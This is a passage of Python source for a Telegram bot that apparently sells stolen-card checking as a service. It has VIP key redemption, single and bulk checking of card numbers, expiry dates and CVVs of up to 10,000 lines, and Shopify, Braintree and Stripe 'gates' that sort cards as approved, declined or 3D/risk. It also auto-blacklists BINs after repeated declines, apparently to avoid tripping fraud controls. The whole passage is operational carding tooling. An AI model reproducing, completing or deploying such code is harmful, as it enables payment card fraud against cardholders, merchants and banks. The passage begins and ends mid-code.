            msg = f'''<b>✅ Key Redeemed Successfully!  
Plan: {plan}  
Expires: {key_expiry.strftime("%Y-%m-%d %H:%M")}</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")

            username = f"@{message.from_user.username}" if message.from_user.username else "No Username"
            admin_msg = f'''🚀 <b>Key Redeemed</b>  
User: {username} (ID: {message.from_user.id})  
Plan: {plan}  
Expires: {key_expiry.strftime("%Y-%m-%d %H:%M")}'''

            for admin_id in admins:
                try:
                    bot.send_message(admin_id, admin_msg, parse_mode="HTML")
                except Exception as e:
                    print(f"Failed to send admin message to {admin_id}: {e}")

        except Exception as e:
            print('ERROR:', e)
            bot.reply_to(message, '<b>❗ An error occurred while redeeming the key.</b>', parse_mode="HTML")

    threading.Thread(target=my_function).start()


# --- Key Generation Command ---
@bot.message_handler(commands=["code"])
def generate_key(message):
    def my_function():
        try:
            if message.from_user.id not in admins:
                bot.reply_to(message, "<b>❗ You are not authorized to generate keys.</b>", parse_mode="HTML")
                return

            parts = message.text.split(' ')
            if len(parts) < 2:
                bot.reply_to(message, "<b>❗ Please provide duration in hours. Example: /code 10</b>", parse_mode="HTML")
                return

            hours = float(parts[1])
            now = datetime.now()
            expire_time = now + timedelta(hours=hours)
            expire_time_str = expire_time.strftime("%Y-%m-%d %H:%M")

            plan = "VIP"
            characters = string.ascii_uppercase + string.digits
            key = 'INDIA-' + '-'.join(''.join(random.choices(characters, k=4)) for _ in range(3))

            data = load_data()
            data[key] = {"plan": plan, "time": expire_time_str}
            save_data(data)

            msg = f'''<b>╠═══════════════════════════╣  
𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀  

𝗣𝗟𝗔𝗡 ➜  {plan}  
𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜  {expire_time_str}  
𝗞𝗘𝗬 ➜  <code>{key}</code>  
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]  
╠════════════════════════════╣</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")

        except Exception as e:
            print('ERROR:', e)
            bot.reply_to(message, f'<b>❗ An error occurred: {e}</b>', parse_mode="HTML")

    threading.Thread(target=my_function).start()



import threading
import json
import time
import requests
import telebot, types
import os
import csv
import pycountry


# Dictionary to store user command usage timestamps
command_sh = {}


CSV_FILE = 'bins_all.csv'

def expand_bank_name(bank_name):
    words = bank_name.split()
    expanded_words = [BANK_NAME_FIXES.get(word, word) for word in words]  # Assuming BANK_NAME_FIXES is defined
    return " ".join(expanded_words)

def get_bin_info_from_csv(fbin):
    if not os.path.exists(CSV_FILE):
        return None  # CSV file not found
    
    try:
        with open(CSV_FILE, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if row[0] == fbin:
                    return {
                        "bin": row[0],
                        "country": row[1],
                        "flag": row[2],
                        "brand": row[3],
                        "type": row[4],
                        "level": row[5],
                        "bank": expand_bank_name(row[6])  # Expand issuer name
                    }
    except Exception as e:
        print(f"Error reading CSV: {e}")
        return None
    return None  # BIN not found

def get_country_name(code, fallback_country_name):
    try:
        country = pycountry.countries.get(alpha_2=code)
        return country.name if country else fallback_country_name
    except Exception as e:
        print(f"Error getting country name: {e}")
        return fallback_country_name



@bot.message_handler(func=lambda message: message.text.lower().startswith('.sh') or message.text.lower().startswith('/sh'))
def respond_to_vbv(message):
    user_id = message.from_user.id
    plan = get_user_plan(user_id)

    if plan == 'FREE':
        bot.reply_to(message, '''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: Shopify charge $0.98 ♻️

✧ ᴍᴇssᴀɢᴇ: ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ
ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ ❌

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ: ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @Watchindiandog</b>''', parse_mode="HTML")
        return

    # --- Extract and Format CC ---
    try:
        raw_input = message.reply_to_message.text if message.reply_to_message else message.text
        cc = format_cc_input(raw_input)  # ✅ Updated: Format input properly
    except:
        cc = 'None'

    if cc == 'None':
        bot.reply_to(message, '''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: Shopify charge $0.98 ♻️

ᴍᴇssᴀɢᴇ: ɴᴏ ᴄᴄ ғᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ᴏʀ ɪɴᴄᴏʀʀᴇᴄᴛ ғᴏʀᴍᴀᴛ ❌

ᴜsᴀɢᴇ: /sh ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</b>''', parse_mode="HTML")
        return

    # --- Rate Limit Check ---
    current_tme = datetime.now()
    last_sh = command_sh.get(user_id, None)

    if last_sh and (current_tme - last_sh).seconds < 45:
        remaining_time = 45 - (current_tme - last_sh).seconds
        bot.reply_to(message, f"<b>Try again after {remaining_time} seconds.</b>", parse_mode="HTML")
        return

    command_sh[user_id] = current_tme
    processing_sh = bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id
    threading.Thread(target=process_sh_cmds, args=(message, processing_sh, cc)).start()


# --- Function to Format Input ---
def format_cc_input(text):
    import re
    match = re.search(r'(\d{13,16})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})', text)
    if not match:
        return 'None'
    
    cc, mm, yy, cvv = match.groups()

    mm = mm.zfill(2)  # 8 -> 08
    if len(yy) == 4:
        yy = yy[2:]  # 2026 -> 26

    return f"{cc}|{mm}|{yy}|{cvv}"


# --- Worker Function for CC Check ---
def process_sh_cmds(message, processing_sh_id, cc):
    gate = 'Shopify charge $0.50'
    start_time = time.time()

    try:
        last = str(vbv(cc))  # 🔁 Assumes vbv() is defined
    except Exception as e:
        last = 'Error'

    # --- BIN Info ---
    bin_info = get_bin_info_from_csv(cc[:6])
    if bin_info:
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        country = get_country_name(bin_info.get('country', 'Unknown'), 'Unknown')
        country_flag = bin_info.get('flag', 'Unknown')
        bank = bin_info.get('bank', 'Unknown')
        level = bin_info.get('level', 'Unknown')
    else:
        brand = card_type = country = country_flag = bank = level = 'Unknown'

    execution_time = time.time() - start_time

    # --- Response messages ---
    msg = f'''<b>𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {last}

𝗜𝗻𝗳𝗼: <code>{cc[:6]} - {card_type} - {brand} - {level}</code>
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝗧𝗶𝗺𝗲: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
</b>'''

    msgd = f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {last}

𝗜𝗻𝗳𝗼: <code>{cc[:6]} - {card_type} - {brand} - {level}</code>
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝗧𝗶𝗺𝗲: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
</b>'''

    if any(x in last.lower() for x in ['funds', 'invalid postal', 'avs', 'added', 'duplicate', 'approved', 'allowed', 'purchase','charge','confirm']):
        bot.edit_message_text(chat_id=message.chat.id, message_id=processing_sh_id, text=msg, parse_mode="HTML")
    else:
        bot.edit_message_text(chat_id=message.chat.id, message_id=processing_sh_id, text=msgd, parse_mode="HTML")

import time
import threading
import asyncio
# Load the user’s plan from data.json (optional, can be removed if not needed)
def get_user_plan(user_id):
    with open('data.json', 'r') as file:
        json_data = json.load(file)
    return json_data.get(str(user_id), {}).get("plan", "FREE")


# Rate limiter dictionary
cmds_last_used = {}

def process_card_cmds(cc):
    brand, card_type, country, flag, bank = get_card_info(cc)
    try:
        result = str(vbv(cc)) 
    except:
        result = "Error"

    status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if any(i in result.lower() for i in ["approved", "funds", "added", "purchase", "duplicate", " avs"]) else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    return f"Card↯ <code>{cc}</code>\nStatus - {status}\nResult -⤿ {result} ⤾\n"

def process_cmds_command(message, processing_msg):
    user_id = message.from_user.id
    text = message.reply_to_message.text if message.reply_to_message else message.text[5:]
    cards = [validate_cc(i.strip()) for i in text.strip().split('\n') if i.strip()]
    cards = [c for c in cards if c][:14]

    if not cards:
        bot.edit_message_text(
            "ɢᴀᴛᴇ ɴᴀᴍᴇ: Shopify charge $0.98 ♻️\n\n"
            "ᴍᴇssᴀɢᴇ: ɴᴏ ᴄᴄ ғᴏᴜɴᴅ ᴏʀ ɪɴᴄᴏʀʀᴇᴄᴛ ғᴏʀᴍᴀᴛ ❌\n\n"
            "ᴜsᴀɢᴇ: /cmds ᴄᴄ|ᴍᴇs|ᴀɴᴏ|ᴄᴠᴠ",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        return

    current_time = time.time()
    if user_id in cmds_last_used and (current_time - cmds_last_used[user_id]) < 50:
        wait = int(50 - (current_time - cmds_last_used[user_id]))
        bot.edit_message_text(f"⏳ Please wait {wait}s before using .cmds again.", chat_id=message.chat.id, message_id=processing_msg.message_id)
        return

    cmds_last_used[user_id] = current_time

    result = ["↯ Shopify charge $0.50 ♻️\n"]
    start = time.time()
    for cc in cards:
        result.append(process_card_cmds(cc))
        time.sleep(1)  # Delay of 1 second per card

    elapsed = time.time() - start
    result.append(f"- 𝗧𝗶𝗺𝗲 - {elapsed:.2f}s")

    bot.edit_message_text("\n".join(result), chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.lower().startswith(('.msh', '/msh')))
def respond_to_cmds(message):
    user_id = message.from_user.id
    plan = get_user_plan(user_id)

    if plan == 'FREE':
        bot.reply_to(message, '''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: Shopify charge $0.98 ♻️

✧ ᴍᴇssᴀɢᴇ: ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ
ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ ❌

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ: ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @Watchindiandog</b>''', parse_mode="HTML")
        return

    msg = bot.reply_to(message, "- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  Shopify charge $0.98 ♻️\n- 𝐒𝐭𝐚𝐭𝐮𝐬 - Processing...⌛️", parse_mode="HTML")
    threading.Thread(target=process_cmds_command, args=(message, msg)).start()



from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import csv, re, time, threading, asyncio, os, json, random
from datetime import datetime, timedelta
GATE_FUNCTIONS = [st, st, st]  # Add these globally or at top of file if not already

# --- BIN Blacklist System ---
BLACKLIST_FILE = 'blacklistmass.txt'
BIN_LOGS = {}  # {bin: {"declines": [], "risks": []}}

def load_blacklist():
    if os.path.exists(BLACKLIST_FILE):
        with open(BLACKLIST_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_blacklist(data):
    with open(BLACKLIST_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

BLACKLIST = load_blacklist()

def is_blacklisted(bin_number):
    if bin_number in BLACKLIST:
        expire_time = datetime.fromisoformat(BLACKLIST[bin_number])
        if datetime.now() < expire_time:
            return True
        else:
            BLACKLIST.pop(bin_number, None)
            save_blacklist(BLACKLIST)
    return False

def add_to_blacklist(bin_number):
    expire_time = datetime.now() + timedelta(hours=48)
    BLACKLIST[bin_number] = expire_time.isoformat()
    save_blacklist(BLACKLIST)

def log_bin_activity(bin_number, result_type):
    now = datetime.now()
    if bin_number not in BIN_LOGS:
        BIN_LOGS[bin_number] = {"declines": [], "risks": []}

    if result_type == "decline":
        BIN_LOGS[bin_number]["declines"].append(now)
    elif result_type == "risk":
        BIN_LOGS[bin_number]["risks"].append(now)

    # Remove logs older than 20 minutes
    BIN_LOGS[bin_number]["declines"] = [t for t in BIN_LOGS[bin_number]["declines"] if now - t <= timedelta(minutes=20)]
    BIN_LOGS[bin_number]["risks"] = [t for t in BIN_LOGS[bin_number]["risks"] if now - t <= timedelta(minutes=20)]

    # Auto-blacklist if thresholds reached
    if len(BIN_LOGS[bin_number]["declines"]) >= 14 or len(BIN_LOGS[bin_number]["risks"]) >= 4:
        add_to_blacklist(bin_number)


# --- Load BIN Info from CSV ---
CSV_FILE = 'bins_all.csv'

def expand_bank_name(bank_name):
    words = bank_name.split()
    expanded_words = [BANK_NAME_FIXES.get(word, word) for word in words]  # Assuming BANK_NAME_FIXES is defined
    return " ".join(expanded_words)

def get_bin_info_from_csv(fbin):
    if not os.path.exists(CSV_FILE):
        return None
    
    try:
        with open(CSV_FILE, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if row[0] == fbin:
                    return {
                        "bin": row[0],
                        "country": row[1],
                        "flag": row[2],
                        "brand": row[3],
                        "type": row[4],
                        "level": row[5],
                        "bank": expand_bank_name(row[6])
                    }
    except Exception as e:
        print(f"Error reading CSV: {e}")
        return None
    return None

def is_valid_cc_format(line):
    pattern = r'^\d{15,16}\|\d{2}\|\d{2,4}\|\d{3}$'
    return bool(re.match(pattern, line.strip()))

active_checks = {}
stopuser = {}

# --- Main Handler ---
@bot.message_handler(commands=['b377txt'])
@bot.message_handler(regexp=r'^\.b377txt')
def ustxt_cmd(message):
    user_id = message.from_user.id
    plan = get_user_plan(user_id)

    if plan == 'FREE':
        bot.reply_to(message, '''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: Braintree auth charge 0.01$ ♻️

✧ ᴍᴇssᴀɢᴇ: ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ
ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ ❌

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ: ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @MKNXW</b>''', parse_mode="HTML")
        return

    if not (message.reply_to_message and message.reply_to_message.document):
        bot.reply_to(message,
            "ɢᴀᴛᴇ ɴᴀᴍᴇ: sᴛʀɪᴘᴇ ᴀᴜᴛʜ ♻️\n\n"
            "ᴍᴇssᴀɢᴇ: ɴᴏ ᴄᴄ ғᴏᴜɴᴅ ᴏʀ ɪɴᴄᴏʀʀᴇᴄᴛ ғᴏʀᴍᴀᴛ ❌\n\n"
            "ᴜsᴀɢᴇ: /b3txt [ reply to fileLimited 1K ]"
        )
        return

    handle_ustxt_command(message)


def handle_ustxt_command(message):
    user_id = str(message.from_user.id)
    plan = get_user_plan(user_id)

    if plan == 'FREE':
        bot.reply_to(message, '''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: Braintree auth charge 0.01$ ♻️

✧ ᴍᴇssᴀɢᴇ: ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ
ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ ❌

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ: ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @MKNXW</b>''', parse_mode="HTML")
        return

    if active_checks.get(user_id, 0) >= 2:
        bot.reply_to(message, "⚠️ You already have 2 active checks running. Please wait for one to finish.")
        return

    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        input_text = downloaded_file.decode('utf-8', errors='ignore')

        cards = []
        for cc in input_text.split('\n'):
            try:
                x = re.findall(r'\d+', cc)
                if len(x) >= 4:
                    ccn, mm, yy, cvv = x[0], x[1], x[2], x[3]
                    if mm.startswith('2'): mm, yy = yy, mm
                    if len(mm) >= 3: mm, yy, cvv = yy, cvv, mm
                    if len(yy) == 4: yy = yy[-2:]
                    formatted = f"{ccn}|{mm}|{yy}|{cvv}"
                    if is_valid_cc_format(formatted):
                        cards.append(formatted)
            except:
                continue

        cards = cards[:10000]
        if not cards:
            bot.reply_to(message,
                "ɢᴀᴛᴇ ɴᴀᴍᴇ: sᴛʀɪᴘᴇ ᴀᴜᴛʜ ♻️\n\n"
                "ᴍᴇssᴀɢᴇ: ɴᴏ ᴄᴄ ғᴏᴜɴᴅ ᴏʀ ɪɴᴄᴏʀʀᴇᴄᴛ ғᴏʀᴍᴀᴛ ❌\n\n"
                "ᴜsᴀɢᴇ: /b3txt [ reply to file Limited 10K ]"
            )
            return

        active_checks[user_id] = active_checks.get(user_id, 0) + 1
        msg = bot.reply_to(message, f"𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 {len(cards)}  𝘾𝙖𝙧𝙙𝙨...⌛", parse_mode="HTML")

        stop_key = f"{user_id}_{msg.message_id}"
        stopuser[stop_key] = {'status': 'start'}

        threading.Thread(target=process_cards, args=(message, msg.message_id, cards, user_id)).start()

    except Exception:
        bot.reply_to(message, "⚠️ Unable to read the file.", parse_mode="HTML")




def process_cards(message, message_id, cards, user_id):
    approved = 0
    declined = 0
    otp_cards = 0
    total = len(cards)
    checked_cards = set()
    start_all = time.time()
    gate_index = 0
    try:
        for cc in cards:
            if stopuser.get(user_id, {}).get('status') == 'stop':
                elapsed = time.time() - start_all
                elapsed_formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=message_id,
                    text=f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - Braintree auth play ♻️\n\n"
                         f"- 𝐓𝐨𝐭𝐚𝐥 Found 𝐈𝐧𝐩𝐮𝐭 -  {total}\n"
                         f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 - {len(checked_cards)}\n"
                         f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ {approved}\n"
                         f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜{declined}\n"
                         f"• 𝙍𝙄𝙎𝙆 🏴‍☠️ ➜{otp_cards}\n"
                         f"Time: {elapsed_formatted}\n"
                         f"𝙎𝙏𝘼𝙏𝙐𝙎 ➜ Stop 🔴 All ✅\n",
                    parse_mode="HTML"        
                )
                return  
                

            cc = cc.strip()
            if not cc or cc in checked_cards:
                continue

            bin_number = cc[:6]

            if is_blacklisted(bin_number):
                result = "Blacklisted BIN Found"
            else:
                
                start_time = time.time()
                try:
                    current_gate = GATE_FUNCTIONS[gate_index % len(GATE_FUNCTIONS)]
                    
                    result = str(current_gate(cc))
                except:
                    result = "Error"
                execution_time = time.time() - start_time
                bin_info = get_bin_info_from_csv(cc[:6]) or {}
                brand = bin_info.get('brand', 'Unknown')
                card_type = bin_info.get('type', 'Unknown')
                country = bin_info.get('country', 'Unknown')
                country_flag = bin_info.get('flag', '🏳️')
                bank = bin_info.get('bank', 'Unknown')
                level = bin_info.get('level', 'Unknown')

                if any(x in result.lower() for x in ["funds", "invalid postal", "avs", "added", "duplicate", "approved", "purchase"]):
                    approved += 1
                    msg = f'''<b>Approved ✅

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree auth play ♻️ 
𝐑𝐞𝐬𝗽𝗼𝗻𝐬𝗲: {result}

𝗜𝗻𝗳𝗼: <code>{cc[:6]} - {card_type} - {brand} - {level}</code>
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝗧𝗶𝗺𝗲: {execution_time:.2f} seconds
</b>'''
                    bot.send_message(message.chat.id, msg, parse_mode="HTML")

                elif any(x in result.lower() for x in ["3d_required", "otp", "action_required", "3d", "risk"]):
                    otp_cards += 1
                    log_bin_activity(bin_number, "risk")
                else:
                    declined += 1
                    log_bin_activity(bin_number, "decline")
            gate_index += 1                      
 
            keyboard = InlineKeyboardMarkup(row_width=1)
            keyboard.add(
                InlineKeyboardButton(f"𝙎𝙏𝘼𝙏𝙐𝙎 ➜  {result}", callback_data="noop"),
                InlineKeyboardButton(f"𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜{approved}", callback_data="noop"),
                InlineKeyboardButton(f"𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 💀 ➜{declined}", callback_data="noop"),
                InlineKeyboardButton(f"𝙍𝙄𝙎𝙆  🏴‍☠️  ➜{otp_cards}", callback_data="noop"),
                InlineKeyboardButton(f"Total ♻ ➜ {len(checked_cards)}/{total}", callback_data="noop"),
                InlineKeyboardButton("Stop", callback_data=f"stop_{user_id}")
            )

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message_id,
                text=f"Checking Card <code>{cc}</code>\nGate ➜ <b>Braintree auth play </b>",
                reply_markup=keyboard,
                parse_mode="HTML"
            )

            time.sleep(4)
            checked_cards.add(cc)

        elapsed = time.time() - start_all
        elapsed_formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message_id,
            text=f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - Braintree auth play ♻️\n\n"
                 f"- 𝐓𝐨𝐭𝐚𝐥 𝐂𝐂 𝐈𝐧𝐩𝐮𝐭 -  {total}\n"
                 f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜   {approved}\n"
                 f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜  {declined}\n"
                 f"• 𝙍𝙄𝙎𝙆 🏴‍☠️ ➜  {otp_cards}\n"
                 f"Time: {elapsed_formatted}\n"
                 f"𝐒𝐭𝐚𝐭𝐮𝐬 - Checked All ✅\n",
            parse_mode="HTML"
        )

    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error: {e}")
    finally:
        active_checks[user_id] = max(0, active_checks.get(user_id, 1) - 1)
        stopuser.pop(user_id, None)


@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def handle_stop(call):
    user_id = call.data.split('_')[1]
    if call.from_user.id == int(user_id):
        stopuser[user_id] = {'status': 'stop'}
        bot.answer_callback_query(call.id, "Stopping your check...")
    else:
        bot.answer_callback_query(call.id, "❌ You can't stop someone else's check.")



# ========== /stxt Fully Independent ==========
active_checks_stxt = {}
stopuser_stxt = {}
CHECKERS_STXT = [st]  # Random checkers for /stxt

# --- /stxt Command Handler ---
@bot.message_handler(commands=['stxt'])
@bot.message_handler(regexp=r'^\.stxt')
def stxt_cmd(message):
    user_id = message.from_user.id
    plan = get_user_plan(user_id)

    if plan == 'FREE':
        bot.reply_to(message, '''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: stripe auth v1 ♻️

✧ ᴍᴇssᴀɢᴇ: ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ
ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ ❌

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ: ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @MKNXW</b>''', parse_mode="HTML")
        return

    if not (message.reply_to_message and message.reply_to_message.document):
        bot.reply_to(message,
            "ɢᴀᴛᴇ ɴᴀᴍᴇ: sᴛʀɪᴘᴇ ᴀᴜᴛʜ ♻️\n\n"
            "ᴍᴇssᴀɢᴇ: ɴᴏ ᴄᴄ ғᴏᴜɴᴅ ᴏʀ ɪɴᴄᴏʀʀᴇᴄᴛ ғᴏʀᴍᴀᴛ ❌\n\n"
            "ᴜsᴀɢᴇ: /stxt [ reply to fileLimited 1K ]"
        )
        return

    handle_stxt_command(message)


def handle_stxt_command(message):
    user_id = str(message.from_user.id)
    plan = get_user_plan(user_id)

    if plan == 'FREE':
        bot.reply_to(message, '''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: stripe auth v1 ♻️

✧ ᴍᴇssᴀɢᴇ: ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ
ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ ❌

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ: ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @MKNXW</b>''', parse_mode="HTML")
        return

    if active_checks_stxt.get(user_id, 0) >= 2:
        bot.reply_to(message, "⚠️ You already have 2 active /stxt checks running.")
        return

    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        input_text = downloaded_file.decode('utf-8', errors='ignore')

        cards = []
        for cc in input_text.split('\n'):
            try:
                x = re.findall(r'\d+', cc)
                if len(x) >= 4:
                    ccn, mm, yy, cvv = x[0], x[1], x[2], x[3]
                    if mm.startswith('2'): mm, yy = yy, mm
                    if len(mm) >= 3: mm, yy, cvv = yy, cvv, mm
                    if len(yy) == 4: yy = yy[-2:]
                    formatted = f"{ccn}|{mm}|{yy}|{cvv}"
                    if is_valid_cc_format(formatted):
                        cards.append(formatted)
            except:
                continue

        cards = cards[:10000]

        if not cards:
            bot.reply_to(message, "⚠️ Unable to read the file.")
            return

        active_checks_stxt[user_id] = active_checks_stxt.get(user_id, 0) + 1

        msg = bot.reply_to(message, f"𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 {len(cards)}  𝘾𝙖𝙧𝙙𝙨...⌛", parse_mode="HTML")

        stop_key = f"{user_id}_{msg.message_id}"
        stopuser_stxt[stop_key] = {'status': 'start'}

        threading.Thread(target=process_cards_stxt, args=(message, msg.message_id, cards, user_id)).start()

    except Exception:
        bot.reply_to(message, "⚠️ Unable to read the file.")


def process_cards_stxt(message, message_id, cards, user_id):
    approved, declined, otp_cards = 0, 0, 0
    total = len(cards)
    checked_cards = set()
    start_all = time.time()

    try:
        for cc in cards:
            if stopuser_stxt.get(user_id, {}).get('status') == 'stop':
                elapsed = time.time() - start_all
                elapsed_formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=message_id,
                    text=f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - stripe auth play ♻️\n\n"
                         f"- 𝐓𝐨𝐭𝐚𝐥 Found 𝐈𝐧𝐩𝐮𝐭 -  {total}\n"
                         f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 - {len(checked_cards)}\n"
                         f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ {approved}\n"
                         f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜{declined}\n"
                         f"• 3D Card 🏴‍☠️ ➜{otp_cards}\n"
                         f"Time: {elapsed_formatted}\n"
                         f"𝙎𝙏𝘼𝙏𝙐𝙎 ➜ Stop 🔴 All ✅\n",
                    parse_mode="HTML"        
                )
                return

            cc = cc.strip()
            if not cc or cc in checked_cards:
                continue

            start_time = time.time()
            try:
                checker = random.choice(CHECKERS_STXT)
                result = str(checker(cc))
            except Exception:
                result = "Error"
            execution_time = time.time() - start_time

            bin_info = get_bin_info_from_csv(cc[:6]) or {}
            brand = bin_info.get('brand', 'Unknown')
            card_type = bin_info.get('type', 'Unknown')
            country = bin_info.get('country', 'Unknown')
            country_flag = bin_info.get('flag', '🏳️')
            bank = bin_info.get('bank', 'Unknown')
            level = bin_info.get('level', 'Unknown')

            if any(x in result.lower() for x in ["funds", "invalid postal", "avs", "added", "duplicate", "approved", "purchase"]):
                approved += 1
                msg = f'''<b>Approved ✅

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: /stxt Gateway
𝐑𝐞𝐬𝗽𝗼𝗻𝐬𝗲: {result}

𝗜𝗻𝗳𝗼: <code>{cc[:6]} - {card_type} - {brand} - {level}</code>
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
